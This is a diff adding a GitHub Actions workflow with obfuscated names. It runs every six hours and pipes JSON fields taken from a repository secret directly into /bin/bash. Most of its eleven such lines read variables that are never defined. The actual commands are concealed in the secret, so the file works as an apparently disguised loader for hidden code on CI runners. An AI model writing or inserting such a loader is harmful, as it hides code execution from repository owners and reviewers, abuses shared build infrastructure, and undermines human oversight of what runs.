@@ -1,0 +1,28 @@
+name: weiruyuan6789
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: weiruyuan6789
+        env:
+          tb9: ${{ secrets.tb9 }}
+        run: |
+          echo $tb9 | jq -r .r99 | /bin/bash
+          echo $c9 | jq -r .tjy5 | /bin/bash
+          echo $qtsjg60 | jq -r .pfvkr49 | /bin/bash
+          echo $fif07514 | jq -r .zlsw88 | /bin/bash
+          echo $gqu8 | jq -r .guo1 | /bin/bash
+          echo $t67 | jq -r .eskpn96972 | /bin/bash
+          echo $ifgg072 | jq -r .rlal36 | /bin/bash
+          echo $vexo82 | jq -r .dka49255 | /bin/bash
+          echo $z2191 | jq -r .z96 | /bin/bash
+          echo $iolvx23072 | jq -r .t6529 | /bin/bash
+          echo $mi0463 | jq -r .wgkie59 | /bin/bash
+
